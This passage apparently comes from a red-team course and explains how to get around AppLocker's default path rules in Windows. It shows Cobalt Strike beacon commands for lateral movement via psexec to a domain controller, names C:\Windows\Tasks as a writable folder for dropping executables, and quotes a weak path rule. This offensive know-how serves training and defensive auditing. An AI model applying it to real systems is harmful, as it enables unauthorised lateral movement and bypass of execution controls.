The default rules allow execution from anywhere within C:\Program Files and C:\Windows (including subdirectories).  Moving laterally to a protected machine via psexec is trivial, because the service executable is written into C:\Windows.
```
beacon> jump psexec64 dc.dev-studio.com smb
Started service b8f5313 on dc.dev-studio.com
[+] established link to child beacon: 10.10.150.10
```
  

If you're on a protected machine as a standard user, there are several directories within C:\Windows that are writeable.  One such example is `C:\Windows\Tasks`.  This would allow us to copy an executable into this directory and run it.
```
beacon> powershell Get-Acl C:\Windows\Tasks | fl

```
  

When enumerating the rules, you may also find additional weak rules that system administrators have put in.  This is an example of a rule I've genuinely seen in production:
```
<FilePathCondition Path="*\AppV\*"/>
```
